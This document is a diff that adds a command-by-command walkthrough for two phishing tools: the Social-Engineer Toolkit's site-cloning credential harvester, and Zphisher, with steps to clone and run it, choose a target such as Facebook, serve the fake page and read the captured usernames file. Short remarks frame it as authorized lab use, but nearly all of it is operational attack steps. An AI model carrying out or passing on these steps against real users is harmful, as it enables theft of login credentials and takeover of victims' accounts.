@@ -1,0 +1,63 @@
+# 1. Start SET
+sudo setoolkit
+
+# 2. Accept the Terms
+y
+
+# 3. Main Menu
+1) Social-Engineering Attacks
+
+# 4. Website Attack Vectors
+2) Website Attack Vectors
+
+# 5. Credential Harvester
+3) Credential Harvester Attack Method
+
+# 6. Site Cloner
+2) Site Cloner
+
+# 7. Enter your local IP address
+192.168.1.50
+
+# 8. Enter the website URL to clone
+https://example.local
+
+# 9. Wait for credentials to appear in the SET terminal
+# (after a user submits the login form in the authorized lab)
+
+# 10. Stop SET
+Ctrl + C
+
+======Z fisher ========
+
+# 1. Install required dependencies
+sudo apt update && sudo apt install git php curl -y
+
+# 2. Clone Zphisher
+git clone https://github.com/htr-tech/zphisher
+
+# 3. Move into folder
+cd zphisher
+
+# 4. Give permission
+chmod +x zphisher.sh
+
+# 5. Run tool
+bash zphisher.sh
+
+# 6. Choose target (example: Facebook)
+01
+
+# 7. Select page type
+1
+
+# 8. Select hosting option
+1 (Localhost)
+
+# 9. Copy generated URL and open in browser (lab use only)
+
+# 10. View captured credentials (if submitted)
+cat auth/usernames.dat
+
+# 11. Stop tool
+Ctrl + C
